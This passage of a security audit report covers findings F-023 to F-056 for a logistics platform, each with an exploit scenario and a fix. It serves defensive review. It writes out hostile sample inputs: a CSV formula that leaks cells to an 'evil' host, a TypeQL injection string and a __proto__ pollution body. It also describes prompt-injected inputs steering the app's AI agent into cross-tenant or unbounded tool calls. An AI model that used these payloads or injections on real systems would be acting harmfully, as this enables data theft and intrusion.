**Recommendation.** Validate call.function.arguments against Tool::parameters before dispatch and push a tool-result error back to the model on failure. Replace unwrap_or(json!({})) with an explicit parse-failure branch. Fix the plan_route schema so the advertised type matches what the exec deserializes, and add maxItems.

### F-023 — aggregateDaily sums unconstrained floating-point amounts for the money path, contradicting the integer-minor-unit MoneySchema

**MEDIUM** · confidence 0.70 · `numeric-handling` · `packages/algos/src/index.ts:93`

The costs parameter is typed with a bare number, not the integer minor-unit representation the contracts mandate. The reduce has no validation: fractional amounts accumulate IEEE-754 error, a negative amount reduces the total, and a single NaN or Infinity makes the whole report total non-finite with no error raised. The divergence is confirmed on the backend: the Rust CostEntry declares amount_minor as i64 -- signed, so it accepts negatives the schema rejects, and magnitudes above 2^53 that lose precision as JS numbers. Filtering is also exact string equality on day, so mismatched entries are dropped with no count or residual.

**Exploit scenario.** A driver submits a cost entry with amount -50000, accepted by the Rust i64 field and never revalidated, offsetting other entries so the daily total looks unremarkable while individual line items are inflated for reimbursement. A variant with 1e309 makes the total non-finite. A third submits expenses whose day was derived in a different timezone, so they vanish from the total while remaining attached to the report.

**Recommendation.** Carry integer minor units and reject non-integers at the boundary; better, parse costs through MoneySchema and aggregate per currency as the report schema's superRefine already does. Make the Rust amount_minor unsigned or add an explicit non-negative validator, and cap it at 2^53-1. Return the count of entries whose day did not match.

### F-024 — Logout does not clear persisted login drafts, leaving the previous driver's email and server URL on the device

**LOW** · confidence 0.70 · `information-disclosure` · `apps/mobile/lib/core/data/work_store.dart:205`

The login screen persists field contents as they are typed via saveDraft('server') and saveDraft('email'). logout() clears session, tokens, apiBase, expiry and driverId, and resets organization/hub, but does not touch any draft key; the only draft clears are for task and cost after successful writes. The password field has no onChanged, so the password itself is correctly not persisted. There is also a functional consequence: selectWorkspace refuses to switch org/hub whenever any draft value is non-empty, so a leftover email draft permanently blocks workspace switching with a misleading error.

**Exploit scenario.** A pool device is handed from one driver to the next after logout, or is later examined forensically. Selecting the draft keys returns the previous driver's corporate email and the private API hostname -- useful for targeted phishing and for locating the internal endpoint.

**Recommendation.** Delete the draft rows inside the logout transaction, and stop persisting the email field on every keystroke unless a remember-me option is explicitly chosen.

### F-025 — leaf() recurses without a depth bound on nested single-element arrays from backend JSON

**LOW** · confidence 0.70 · `unbounded-recursion` · `apps/web/src/data/api-adapter.ts:22`

leaf returns leaf(v[0]) whenever the value is a single-element array, with no depth counter and no iterative rewrite. Depth is controlled entirely by the untrusted response body: flatten calls leaf on every property of the task and of every stop. JSON.parse accepts deeply nested arrays that this function cannot, so a response nested tens of thousands deep drives leaf into a stack overflow. The throw propagates out of load(), and the whole workspace renders only the error banner.

**Exploit scenario.** A tenant user stores a task field whose JSON value is a 50,000-deep chain of single-element arrays. Every dispatcher who loads the board hits the stack overflow, load() rejects, and the workspace is unusable until the record is removed server-side -- a persistent, data-driven denial of the dashboard.

**Recommendation.** Add a depth parameter and bail out past ~16, or rewrite as a while loop. Wrap each toTask in try/catch so one hostile record cannot blank the entire board.

### F-026 — PKCE verifier is only cleared on the success path, so it survives every failure

**LOW** · confidence 0.70 · `auth-bypass` · `apps/web/src/lib/auth.ts:83`

finishLogin removes the verifier only after a successful exchange; the missing-verifier throw and the !res.ok throw both return before it, and Callback's catch performs no cleanup. A user who abandons a login after startLogin writes the verifier likewise leaves it behind. logout() does include the verifier key but is only called on a failed refresh and from nowhere in the UI. The verifier therefore persists for the lifetime of the tab under a fixed, well-known key.

**Exploit scenario.** A victim clicks sign-in and backs out at the Keycloak prompt. The verifier stays in sessionStorage. Later, in the same tab, they visit an attacker page that navigates to /callback?code=... Because the verifier is still present, the handler proceeds to a real token exchange instead of aborting -- turning the missing-state defect from an inert error page into a live exchange attempt.

**Recommendation.** Wrap the exchange in try/finally and remove the verifier in the finally block so it is cleared on every path; also clear it when the callback renders its error branch.

### F-027 — dijkstra reads inherited Object.prototype keys, causing an unhandled TypeError on an adversarial node name

**MEDIUM** · confidence 0.65 · `input-validation` · `packages/algos/src/index.ts:23`

The graph type has no runtime schema anywhere in api-contracts. dijkstra indexes it with untrusted node names using plain bracket access, which resolves the prototype chain: graph['constructor'], graph['toString'], graph['valueOf'] and graph['__proto__'] all return truthy non-array values on a JSON.parsed object, so the `?? []` fallback does not fire. An edge declaring to:'constructor' is added to the open set, relaxed to a finite cost, selected as the minimum, and then iterated -- throwing 'not iterable'. Separately, e.weight is never validated as finite, so a NaN weight passes the negative-weight guard and silently drops the edge.

**Exploit scenario.** An untrusted graph payload contains {"Hub":[{"to":"constructor","weight":1}]}. dijkstra selects 'constructor' and throws an uncaught TypeError, taking down the route-planning request. A quieter variant sets a NaN-producing weight on the edge that would otherwise be chosen, silently removing it so the planner returns a longer route or null.

**Recommendation.** Use Object.create(null) or hasOwnProperty-guarded access (or a Map). Validate the graph at the boundary: keys constrained by the id schema, weight finite and non-negative, and every `to` referencing a declared key.

### F-028 — A single NaN coordinate poisons the running maximum and forces flag 'none' for the entire batch

**HIGH** · confidence 0.60 · `fail-open` · `packages/algos/src/index.ts:82`

The comparison accumulates worst = Math.max(worst, haversineMeters(a, best)). haversineMeters has no guard against non-finite inputs and returns NaN for any sample whose lat/lng is NaN or undefined; Math.max(x, NaN) is NaN, and NaN is sticky through the rest of the loop. The threshold test then evaluates false for NaN, yielding a clean 'none' even though other samples may have been kilometres apart. The undefined-coordinate path is concrete: the observation schema explicitly permits position:null when quality is 'unavailable', and the algos GeoSample shape differs from the contract shape, so any adapter mapping position?.latitude yields undefined.

**Exploit scenario.** A driver uploads a normal batch plus one observation with quality 'unavailable' and position null -- a perfectly legal record. The adapter maps it to undefined coordinates. If its timestamp falls within the match window, the distance is NaN, the running maximum becomes NaN, and the whole comparison reports 'none', suppressing a legitimate flag the other divergent samples would have raised.

**Recommendation.** Guard haversineMeters to return Infinity or throw on non-finite inputs, and skip or hard-flag any pair whose computed distance is not finite. Validate GeoSample at the algos boundary with a schema derived from the coordinate contract.

### F-029 — Tool executors carry no caller identity; tools run with ambient backend privilege

**MEDIUM** · confidence 0.60 · `authz-bypass` · `backend/crates/altius-api/src/agent.rs:32`

The executor type takes only the model-produced Value. There is no principal, subject, org or role parameter anywhere in the tool contract, in drive's dispatch, or in resume's approve path. dispatch_tools closes over Arc<AppState> and reaches straight for the config credentials. The caller's identity was dropped at the agent boundary, so nothing inside exec can re-authorize.

**Exploit scenario.** The next tool added is the obvious one for a dispatch agent -- assign_task or list_tasks. Its exec cannot consult the caller, so it queries the store unscoped or with an org id from the model's own arguments. A prompt-injected task note supplies a task_id from another tenant and the tool executes it, because backend credentials are ambient and the caller's org was never in scope.

**Recommendation.** Thread the principal through the agent boundary (change Exec to take &Principal, or capture the per-request AuthUser in the closure dispatch_tools already builds per request), and require every exec to re-authorize its arguments with the same org_of scoping the REST handlers use.

### F-030 — Idempotency check-then-insert race allows duplicate event application

**MEDIUM** · confidence 0.60 · `toctou` · `backend/crates/altius-api/src/store.rs:177`

record_event queries for an existing device-event with the same request-key, returns early on a hit, and only later inserts and applies stage mutations. Read and write are separate statements against a snapshot, so two concurrent requests with the same idempotency_key both observe no prior event and both proceed. The @unique annotation on request-key only fires at commit.

**Exploit scenario.** A client fires two identical sync-events requests in parallel with the same idempotencyKey. Either the loser's commit is rejected and the whole batch 500s (losing genuinely new events in the batch), or the stage transition is applied twice, double-advancing a stop past a state check_transition was meant to gate.

**Recommendation.** Do not gate on a prior read. Attempt the insert unconditionally and treat the request-key uniqueness violation at commit as the idempotent-replay signal. Retry on conflict rather than surfacing a 500 for the whole batch.

### F-031 — compareGpsStreams does an O(n*m) full scan per app sample over unbounded observation arrays

**MEDIUM** · confidence 0.60 · `algorithmic-complexity` · `packages/algos/src/index.ts:81`

The nearest-timestamp search nests a full linear scan of the vehicle array inside a loop over the app array, and the maxTimeGapMs window is applied only after the inner loop completes, so it prunes nothing. Cost is exactly |app| x |vehicle| with no early exit. Both arrays are attacker-sized: the location history schema has neither a minimum nor a maximum on observations, in contrast to the event batch schema which is explicitly capped at 500 -- so the location path is missing the cap the event path has.

**Exploit scenario.** A device submits one location history with 200,000 app-source and 200,000 vehicle-source observations, all individually valid and uniquely identified. The comparison enters a 4e10-iteration synchronous non-yielding loop, blocking the event loop. Because the comparison never completes, the anomaly check for that driver's day never produces a review flag -- the blowup doubles as a way to stall the control itself.

**Recommendation.** Sort both streams by time once and sweep with two pointers or binary search, reducing the match to O((n+m) log n) so the window prunes inside the scan. Add minimum and maximum bounds to the observations array, mirroring the cap already applied to the event batch.

### F-032 — A single malformed localStorage value silently discards all locally persisted preferences

**LOW** · confidence 0.60 · `data-loss` · `apps/web/src/data/api-adapter.ts:115`

createLocalAdapter.load() correctly guards JSON.parse and handles the schema case, so no unhandled exception escapes. But the sole consumer swallows both outcomes with .catch(() => base). Any single field that fails the schema therefore discards the entire persisted state -- records, workflow, permissions, reviews, organization, hub, role, locale -- and substitutes empty defaults with no notice. The next update() writes those defaults back over the stored blob, making the loss permanent.

**Exploit scenario.** Anyone with momentary browser access, or a transient XSS on the origin, sets the storage key to {"version":2}. On the next load the operator's stored hubs, teams, workflow steps, permission toggles and review decisions are replaced by empty defaults with no error shown, and the first subsequent edit destroys any chance of recovery.

**Recommendation.** Distinguish 'nothing stored' from 'stored data rejected': surface the rejection through the provider's error channel, and preserve the original raw value under a .corrupt key rather than overwriting it.

### F-033 — Callback ignores the OAuth error response and leaves code in the URL on the failure path

**LOW** · confidence 0.60 · `auth-bypass` · `apps/web/src/features/callback.tsx:41`

The handler reads only `code`. When Keycloak returns ?error=access_denied or similar there is no code, so it falls through to a generic 'Authorization code is missing' message, discarding the real OAuth error. No error path clears the PKCE verifier or the query string. On success router.replace removes the code from the address bar, but on every failure path the URL retains ?code=... while the error page is displayed -- and the failure branch is precisely the case where the code has not been consumed.

**Exploit scenario.** An attacker page sends the victim to /callback?code=<unconsumed code>; the exchange fails and the app parks on the error screen with the unredeemed code visible in the address bar, in session-restore data, and in any Referer from a subsequently loaded subresource.

**Recommendation.** Read params.get('error') first and render the actual OAuth error; strip the query string on entry with history.replaceState before performing the exchange; clear the verifier and stored state on every error exit.

### F-034 — Unserialised concurrent refresh can consume a rotated refresh token twice and wipe live credentials

**LOW** · confidence 0.60 · `race-condition` · `apps/web/src/lib/auth.ts:100`

accessToken is not guarded by any in-flight promise. It is wired in as the per-request token supplier, so any page firing several requests at once calls it concurrently. Each caller reads the same refresh token and issues its own refresh. Keycloak rotates the refresh token on every use; with reuse detection enabled the later requests present an already-consumed token, receive a non-2xx, and call logout() -- clearing the valid tokens a sibling call just wrote.

**Exploit scenario.** The dashboard mounts and fires parallel API calls just as the token enters its 30-second refresh window. The first rotates successfully; the other two receive 400 and both call logout(), destroying the freshly issued tokens. The user is silently deauthenticated mid-session, and because nothing clears state.session they keep seeing the authenticated shell while every request goes out unauthenticated.

**Recommendation.** Memoise the refresh with a module-level in-flight promise cleared in a finally. Do not call logout() from the failure branch when another refresh has already succeeded -- re-read the stored credentials and only clear if they are still the ones that failed.

### F-035 — Unknown kid in an attacker-supplied token forces an uncached JWKS refetch per request

**LOW** · confidence 0.60 · `unauthenticated-outbound-amplification` · `backend/crates/altius-api/src/auth.rs:77`

find_key sets need_refresh when no cached key matches the requested kid, then performs a fresh HTTP GET with no negative caching and no backoff. kid comes from the unverified JWT header before any signature check, so it is fully attacker-controlled and needs no valid credential. The failure mode itself is correct (fails closed, cache is not poisonable); the issue is the 1:1 amplification from an unauthenticated request to an outbound IdP request.

**Exploit scenario.** An unauthenticated attacker sends a stream of syntactically valid JWTs each with a fresh random kid. Each drives one uncached GET to the Keycloak certs endpoint, using the API as an unauthenticated relay against the IdP and repeatedly surfacing the internal JWKS URL in 503 bodies.

**Recommendation.** Only refetch on unknown kid at most once per short cooldown window, and keep a small negative cache of recently-rejected kids.

### F-036 — nbf is never validated; only exp is explicitly enabled

**LOW** · confidence 0.60 · `auth-bypass` · `backend/crates/altius-api/src/auth.rs:98`

Validation::new(Algorithm::RS256) correctly pins the algorithm, so alg:none and RS->HMAC confusion are rejected, and set_issuer/set_audience enable iss/aud checks. validate_exp is set explicitly, but jsonwebtoken defaults validate_nbf to false and the code never sets it. There is also no typ/azp check, so a same-audience ID token is accepted where an access token is expected.

**Exploit scenario.** A token pre-issued with a future nbf is honoured immediately by every authenticated route, defeating the issuer's intended activation window.

**Recommendation.** Set validation.validate_nbf = true and add set_required_spec_claims. [FIXED in-tree during this session.]

### F-037 — Tenant selection falls back to an unverified organization_id token claim

**HIGH** · confidence 0.55 · `authz-bypass` · `backend/crates/altius-api/src/routes.rs:185`

org_of resolves the tenant as store.organization_of(subject).or_else(|| claim.cloned()), where claim is a raw Keycloak claim. No check that the issuer intended it to be authorization-bearing, none that the caller belongs to that org. The fallback is not an edge case: the only membership rows ever created are for DEFAULT_ADMIN_SUB and there is no provisioning endpoint, so organization_of returns None for essentially every real user -- making the claim the primary tenant selector.

**Exploit scenario.** An attacker whose organization_id claim they can influence (a self-editable Keycloak user attribute surfaced via a protocol mapper) sets it to victim-org and calls GET /tasks, /users, /drivers, /hubs. Their subject has no membership row, the claim wins, and the handlers return the victim tenant's full task list, user roster (PII), hubs and drivers.

**Recommendation.** Drop the claim fallback: return Forbidden when the store has no membership for the subject, and add a provisioning/JIT-sync path. [FIXED in-tree during this session.]

### F-038 — Route guard trusts a client-persisted session boolean rather than token possession

**MEDIUM** · confidence 0.55 · `auth-bypass` · `apps/web/src/app/[[...path]]/view.tsx:33`

The only access control in the routing layer gates on state.session, a plain boolean set by two paths: the authenticated callback, and the completely unauthenticated demo submit in login.tsx which performs no authentication whatsoever. Nothing consults accessToken() or checks for a stored token. The two states also desynchronise dangerously: when a refresh fails, logout() clears all four STORAGE keys but does not touch state.session, so the user keeps the full authenticated shell while holding no token. role is derived from decodeJwt, which does not verify the signature, and falls back to 'Lead' when claims fail to parse.

**Exploit scenario.** An attacker with momentary browser access, or any script on the origin, sets the persisted session flag to true and role to Admin -- or simply clicks the unauthenticated demo sign-in button. Every administrative view renders with no token ever issued and no signature ever verified.

**Recommendation.** Make the guard a function of credential possession, not a stored flag. Have logout() clear state.session and state.role so the two cannot diverge, keep the demo flag on a separate key, and treat decodeJwt output as display-only.

### F-039 — csvCell's formula-trigger regex is anchored at position 0, so a leading space bypasses the guard

**MEDIUM** · confidence 0.55 · `csv-injection` · `apps/web/src/data/adapter.ts:41`

csvCell tests /^[=+@\-\t\r]/ and only then prefixes a quote. The class covers the classic trigger set, but the anchor means any leading character outside the class disables the guard. A leading space is the practical bypass: ' =1+1' fails the test and is emitted unguarded, and importers that trim leading whitespace (Google Sheets on import, LibreOffice with Trim spaces, Excel in several paths) evaluate it as a formula. Locally created tasks are partly protected by the schema's .trim(), but API-sourced tasks never reach that schema.

**Exploit scenario.** A tenant user sets a task title to ' =HYPERLINK("http://evil/?x="&A1&B1,"Delivery note")' with a leading space. A dispatcher exports from the task board or Data Export; the importer trims the space, evaluates the formula, and the victim's click leaks adjacent cell contents.

**Recommendation.** Test past leading whitespace and control characters before applying the guard. [FIXED in-tree during this session.]

### F-040 — Idempotency keys share one global namespace across all tenants

**MEDIUM** · confidence 0.55 · `auth-bypass` · `backend/crates/altius-api/src/store.rs:178`

The replay check matches on the key string alone with no org, hub, driver or task constraint, and request-key is @unique globally. A key claimed by any user in any organization permanently shadows that key for everyone else. The replay branch also returns ev.idempotency_key as server_event_id while the normal path returns ev.event_id, so the two branches yield different attacker-chosen identifiers.

**Exploit scenario.** A driver pre-registers events whose idempotencyKey values match another tenant's key scheme (sequential counters, deviceId:seq). When the victim later syncs a real event with one of those keys, record_event short-circuits and returns Accepted without writing anything. The victim's proof-of-service event is silently dropped and their app shows success.

**Recommendation.** Namespace the key per principal/tenant as a composite, or add membership/org constraints to the replay match. Return the stored event's event-id on the replay path so both branches yield the same identifier. [FIXED in-tree during this session.]

### F-041 — Rust DeviceEvent diverges from the '1:1' DeviceEventSchema, always in the permissive direction

**MEDIUM** · confidence 0.55 · `input-validation` · `packages/api-contracts/src/tasks.ts:16`

The Rust file declares itself a 1:1 mirror, but the two disagree. The Zod schema is .strict() and has no payload field; the Rust struct has payload: serde_json::Value -- arbitrary untyped JSON the contract would reject but the server accepts and stores. Conversely the Rust struct omits four required fields: schemaVersion, deviceSequence, expectedTaskRevision, and observationId/reason. expectedTaskRevision is the optimistic-concurrency token that the receipt schema's revision_conflict code is built on, and it does not exist server-side. stopId is required in Zod but Option in Rust. The receipt shapes also disagree structurally, so a genuine server receipt fails client validation.

**Exploit scenario.** A device posts an event carrying an arbitrary payload and omitting expectedTaskRevision. The Rust handler deserialises it successfully -- the field it does not know about is the one that would have detected a stale revision. Two devices racing on the same stop both succeed with no conflict, producing a lost update on task state. A skip event with no reason is likewise accepted despite the contract requiring one.

**Recommendation.** Make the Rust DeviceEvent field-for-field identical to the schema, make stop_id required, and drop or type the payload. Enforce the skip-requires-reason and revision-conflict invariants in altius-core rather than only in Zod, and add a contract test that round-trips a serialised event through the schema so drift fails CI.

### F-042 — ExpenseCategory enum disagrees between the Zod contract and the Rust mirror

**LOW** · confidence 0.55 · `input-validation` · `packages/api-contracts/src/lhs.ts:4`

The Zod enum declares six values (fuel, toll, parking, meal, maintenance, other); the Rust mirror declares four, omitting meal and maintenance. An expense the contract accepts fails serde deserialisation server-side. This is a money-path divergence: the report's superRefine recomputes per-currency totals from the expense list, so if the server rejects only the offending entries rather than the whole submission, the client-computed totals no longer match the persisted set. The Rust CostEntry also has no revision, no time, and no tenant/hub/driver scope fields, so the expense-scope check has no server-side counterpart.

**Exploit scenario.** A driver submits a report containing a meal expense plus valid fuel entries, with totals correctly summing all of them. The Rust side drops or rejects the meal entry. The stored report's expenses now sum to less than its recorded totals; on re-read the schema fails with 'Incorrect currency totals', or the driver's reimbursement silently loses the entry with no error surfaced.

**Recommendation.** Add Meal and Maintenance to the Rust enum and add a shared fixture test asserting both enumerate the same variants. Add scope, revision and time fields to the Rust CostEntry, and reject an entire submission rather than dropping entries when a category is unrecognised.

### F-043 — Tenant, hub and driver identity in the sync batch are read from locally writable preferences; stage rules enforced only on-device

**MEDIUM** · confidence 0.50 · `authorization` · `apps/mobile/lib/core/data/work_store.dart:350`

Every event pushed to the events endpoint carries identity fields taken verbatim from the local preferences table: tenant_id, hub_id, driver_id, plus a hard-coded device_id. The task_id is the local row id, which for locally created tasks is a client-chosen string. All business-rule enforcement lives client-side -- advance() checks trip state, stage ordering and single-active-task exclusivity, and _event enforces monotonic clock and offset bounds. None of that survives a tampered database: the tasks.stage value, the preferences rows and the trip flag are ordinary writable rows, and the immutability triggers cover only events and reports.

**Exploit scenario.** A driver with a rooted phone edits the preferences table to another organization and driver id, inserts task rows, and taps through arrive/start/complete. On the next sync the events are posted under their own valid token but attributed to another tenant, fabricating completed-delivery records. Confirmed reachable: the backend does not re-derive these from the token (see the sync_events and record_event findings).

**Recommendation.** Have the server derive tenant_id, hub_id and driver_id from the authenticated JWT subject, ignoring or rejecting the body values. Treat client-supplied task_id as untrusted and validate it belongs to the caller's assignment. Re-validate stage ordering server-side rather than relying on advance().

### F-044 — EntityDataSchema uses an unkeyed z.record with unbounded string values, permitting __proto__ keys

**MEDIUM** · confidence 0.50 · `input-validation` · `packages/api-contracts/src/api.ts:26`

The values record omits the key schema, so any string key is accepted, and the string member has no maximum, so values are unbounded. Every other string in these contracts is capped, making this the one escape hatch. Dangerous keys __proto__, constructor and prototype all pass; Zod's record parser assigns onto a fresh object, so a __proto__ key invokes the inherited setter, and any downstream Object.assign or recursive merge of this attacker-controlled map is a prototype-pollution sink. The same hatch exists in the error schema's fieldErrors.

**Exploit scenario.** A client posts EntityData whose values contains {"__proto__":"x","isAdmin":true,"note":"<2MB string>"}. All three keys are accepted. Code that spreads or deep-merges the values pollutes Object.prototype, and the multi-megabyte value is written to a field every sibling contract would have capped at 1000 characters.

**Recommendation.** Give the record an explicit key schema and bound the values, and add a refinement rejecting __proto__, constructor and prototype plus a maximum key count. Apply the same to fieldErrors. Replace the Rust DeviceEvent.payload serde_json::Value with a typed struct.

### F-045 — MembershipSchema lets a client-supplied object assert its own role, tenant, hubs and permission list

**MEDIUM** · confidence 0.50 · `privilege-escalation` · `packages/api-contracts/src/identity.ts:6`

MembershipSchema carries tenantId, role (including 'admin'), hubIds, and a free-form permissions array that includes users.manage and settings.manage. UserSchema embeds an array of them. There is no refinement tying permissions to role, no constraint that tenantId matches an authenticated scope, and no marker separating a server-issued identity document from a client-submitted one -- the same schema serves both directions. The Rust Principal is derived from a Keycloak token, is deliberately not Deserialize, and has no permissions concept at all, so the entire permission vocabulary exists only on the TS side and no server component validates or issues it.

**Exploit scenario.** A driver posts, or seeds into offline state that is later synced, a User object for themselves whose membership claims permissions users.manage, settings.manage, lhs.review and gps.review. The schema accepts it -- every field is individually valid, and .strict() rejects unknown keys, not self-asserted authority. Any client-side gate keyed on those permissions now lets the driver approve their own LHS reports and clear their own GPS review flags.

**Recommendation.** Split the contract: one schema for server-to-client identity responses, and a request-side schema omitting role, permissions and tenantId entirely. Add a refinement asserting permissions is a subset of what the role implies, bound hubIds, and treat permissions as advisory-only for UI rendering.

### F-046 — Adapter write and setError execute inside a React setState updater

**LOW** · confidence 0.50 · `state-corruption` · `apps/web/src/components/demo-provider.tsx:35`

update() performs two side effects inside the setState updater: a localStorage write, and a render-phase setError in the catch. React requires updaters to be pure; StrictMode invokes them twice and concurrent rendering may re-run or discard them. The duplicate write is idempotent, but the discard case is reachable: save() may persist a state React never commits, and the persisted slice covers records, workflow, permissions, reviews, organization, hub and role. Separately the updater commits next even when save() throws, so memory and storage diverge for the rest of the session.

**Exploit scenario.** A concurrent transition interrupts a preference change: save() writes S2 while React discards it and rebases onto S1. The user sees S1, the next reload restores S2, and a permission edit the operator believes they reverted comes back. On a storage failure the session shows changes that were never persisted, with one banner shown once.

**Recommendation.** Move persistence out of the updater: commit the state, then save in an effect that observes the committed value. Hoist pickAdapter() out of the hot path, and do not commit when save() throws unless the divergence is intentional and surfaced.

### F-047 — Per-step tool-call fan-out is unbounded and the MAX_STEPS budget resets on every resume

**LOW** · confidence 0.50 · `missing-loop-bound` · `backend/crates/altius-api/src/agent.rs:225`

drive caps model round-trips at MAX_STEPS=8, which is the right outer control. But the inner `for call in calls` loop has no cap, and calls is third-party output steerable by prompt text; each non-gated call runs exec sequentially, and plan_route's argument list is itself uncapped (distance_matrix_seconds imposes no waypoint limit, unlike optimize_stops). Separately, resume calls drive with a fresh 0..MAX_STEPS budget over client-supplied messages of unbounded length, with no cumulative counter in the state.

**Exploit scenario.** Once any non-gated tool is registered, a prompt-injected input instructs the model to emit 50 parallel calls each with 100 stops: 50 sequential Distance Matrix calls of 10,000 elements, per step, for 8 steps, in one request. Separately a client loops resume, feeding back the state it received, to run unbounded model turns on the org's OpenRouter account.

**Recommendation.** Cap the inner loop and cap plan_route's stops array in both schema and exec; add an origins x destinations limit inside distance_matrix_seconds. Carry a step counter in the persisted run state and decrement it across resumes.

### F-048 — record_report lets the submitter choose their own approval status with no role check

**LOW** · confidence 0.50 · `authz-bypass` · `backend/crates/altius-api/src/routes.rs:368`

record_report has no role gate and passes the client's DailyReport straight to the store. DailyReport.status is a client-supplied LhsStatus whose variants describe a supervisor approval workflow, and record_daily_report writes it verbatim. revision is likewise taken from the body. Only the driver binding is server-controlled.

**Exploit scenario.** A driver posts their own daily report with status "approved" and a high revision. The record is persisted as approved without any supervisor seeing it, and any downstream payout or audit process treats it as supervisor-signed.

**Recommendation.** Force status to Submitted and revision to a server-computed value on this endpoint; expose approval transitions only through a separate handler gated on Admin|Supervisor.

### F-049 — LhsReportSchema accepts a client-authored review history that can assert its own approval

**MEDIUM** · confidence 0.45 · `privilege-escalation` · `packages/api-contracts/src/lhs.ts:7`

The report schema validates the driver's daily report including its status and reviews array. The revision schema has a client-supplied actorId and an action enum including 'approve'. The superRefine walks the review history as a state machine and requires the final state to equal the declared status -- but it only checks the shape of the sequence. It never checks that the reviewer differs from the driver, never checks the actor holds the lhs.review permission, and never bounds the review timestamp against server time. The Rust DailyReport has no reviews field at all, so the entire approval invariant lives only in this Zod schema.

**Exploit scenario.** A driver submits their report with inflated expenses and a hand-written reviews array whose final entry approves it with their own actor id, and status 'approved'. The schema accepts it because draft->submitted->approved is structurally legal. Any consumer that trusts the parsed status to skip a supervisor queue or release reimbursement has been self-approved past.

**Recommendation.** Reject any review whose actorId equals the driverId, and require submit and approve actors to be disjoint. Add a request-side variant forbidding status and reviews outright -- the server should own both -- and mirror the approving actor and timestamp into the Rust DailyReport where the money decision is made.

### F-050 — validateTask is applied only on the editor submit path; assignment, arrival and completion bypass it

**LOW** · confidence 0.45 · `input-validation` · `apps/web/src/features/tasks.tsx:33`

validateTask runs the schema parse and enforces 'a non-unassigned task must have an assignee'. It is called from exactly one place, the TaskEditor submit handler. Three other mutation paths write tasks into state without it: assign(), the detail modal's arrival/completion buttons (which rely only on a disabled attribute for the precondition), and the bulk delete. Because API-sourced tasks were never validated in the first place, these paths can carry a schema-violating task straight through a status change and into the CSV exports. RecordEditor has the same shape.

**Exploit scenario.** An API task whose title is 20,000 characters is marked complete via the detail modal. No schema check runs, the mutated task is written to state, and it flows into both CSV exports with its length bound never applied.

**Recommendation.** Enforce validation at the chokepoint rather than per call site: validate the whole next state inside update(), so every mutation path routes through one check.

### F-051 — Google's waypoint_order is returned to clients as array indices without range validation

**LOW** · confidence 0.45 · `improper-validation-of-third-party-response` · `backend/crates/altius-api/src/maps.rs:275`

optimize_stops copies route.waypoint_order into OptimizedRoute.order with no validation, and the field is documented and consumed as indices into the caller's waypoint list. Nothing checks each index is < waypoints.len(), that there are no duplicates, or that the length matches. leg_seconds and total_meters are likewise unvalidated, and the whole response is parsed with res.json() with no body size bound.

**Exploit scenario.** An attacker positioned to answer for maps.googleapis.com (a TLS-inspecting proxy with a weak trust store, a poisoned resolver) returns waypoint_order [4294967295, 0]. The backend passes the indices through verbatim; a client that trusts the documented contract indexes its own stop array with them and crashes or reorders against out-of-range slots.

**Recommendation.** Reject the response unless waypoint_order is a permutation of 0..waypoints.len(), and check legs.len() against the expected count; on mismatch fall back to greedy_order. Bound the response body rather than using unbounded res.json().

### F-052 — Unauthenticated /api/v3/health discloses backend integration posture

**LOW** · confidence 0.45 · `information-disclosure` · `backend/crates/altius-api/src/routes.rs:69`

health is registered without the AuthUser extractor and returns persistence (live TypeDB reachability), maps (whether a Google key is configured), maps_mode (the exact routing backend) and agent (whether an OpenRouter key is configured). ready is likewise unauthenticated and confirms database reachability.

**Exploit scenario.** An unauthenticated attacker polls /health to learn which third-party credentials the deployment holds and which route mode it uses, then targets the corresponding endpoints and watches persistence:false to time attacks for windows when the database is down.

**Recommendation.** Keep /health and /ready as bare liveness/readiness probes and move integration-posture fields behind an admin-gated diagnostics route, or bind the probes to an internal-only listener.

### F-053 — UserSchema.email is unbounded and memberships/hubIds arrays have no length cap

**LOW** · confidence 0.40 · `input-validation` · `packages/api-contracts/src/identity.ts:9`

email is z.string().email() with no maximum; Zod's email check constrains format, not length, so an arbitrarily long but format-valid address passes and reaches storage. Every other string in these contracts is explicitly capped (displayName 200, name 200, id 128), which makes this a genuine omission. Similarly memberships and hubIds are uncapped, while request contracts elsewhere do cap arrays. An uncapped memberships array compounds the self-asserted-membership finding.

**Exploit scenario.** A client submits a user record with a 64KB format-valid email and a memberships array containing thousands of entries. The schema accepts both. The oversized address is written to a column sized for a normal email, and the membership list is persisted in full, each entry carrying its own unvalidated role and permissions.

**Recommendation.** Add .max(254) to email (the RFC 5321 limit) and explicit caps to memberships and hubIds, matching the pattern already used for the event batch. Mirror the bounds in the Rust Id/String fields, which are currently unbounded aliases.

### F-054 — mockLocationReported is nullable, letting a spoofing device omit the mock-location signal

**LOW** · confidence 0.40 · `fail-open` · `packages/api-contracts/src/location.ts:19`

The field is z.boolean().nullable() -- a device may report null for the single field whose purpose is to declare that the OS flagged the fix as simulated. The superRefine constrains position and accuracyMeters against quality but says nothing about this field, so null is legal for every quality level including 'accurate'. Any consumer checking truthiness treats null identically to false: an absent signal reads as 'not spoofed'. There is no counterpart field in the Rust mirror at all. Related: accuracyMeters and speedMetersPerSecond are finite and non-negative with no maximum.

**Exploit scenario.** A driver runs a mock-location app and their modified client sets mockLocationReported to null on every observation rather than true. The schema accepts it and downstream truthiness checks treat the observation as genuine. Combined with the two fail-open algo findings, no layer of the GPS integrity stack registers the spoof.

**Recommendation.** Require a non-null boolean for any observation whose quality is not 'unavailable', in the existing superRefine, so an observation claiming a fix must make an explicit assertion about mock status. Add maximum bounds to accuracyMeters and speedMetersPerSecond.

### F-055 — Store::esc escapes only backslash and double-quote; control characters pass into TypeQL string literals

**MEDIUM** · confidence 0.35 · `sql-injection` · `backend/crates/altius-api/src/store.rs:23`

esc is `s.replace('\\',...).replace('"',...)`. It is applied at every one of the ~30 quoted interpolation sites (verified), and all unquoted interpolations resolve to non-string Rust types, so those are not injectable. What esc does not handle is raw C0 control characters: a JSON body may carry literal newline/CR/tab, which are emitted verbatim inside a double-quoted TypeQL literal. Whether that is exploitable depends on TypeQL lexer behaviour on an unterminated literal, which could not be resolved statically.

**Exploit scenario.** POST a task title of `x\n; insert $z isa organization, has org-id "attacker"; #`. If the lexer terminates the literal at the newline, the injected `;` closes the statement and the following clause executes in the same write transaction, with `#` commenting out the remainder. Same primitive via stop.address, stop.name, and cost note.

**Recommendation.** Use the TypeDB driver's parameter binding if available. Otherwise extend esc to escape or reject all C0 control characters (0x00-0x1F) and 0x7F, and validate structural identifiers against an allowlist regex at the trust boundary. Add a unit test asserting a newline plus `";` cannot change the generated statement count.

### F-056 — dijkstra treats an empty-string node name as 'no node found' and silently abandons the search

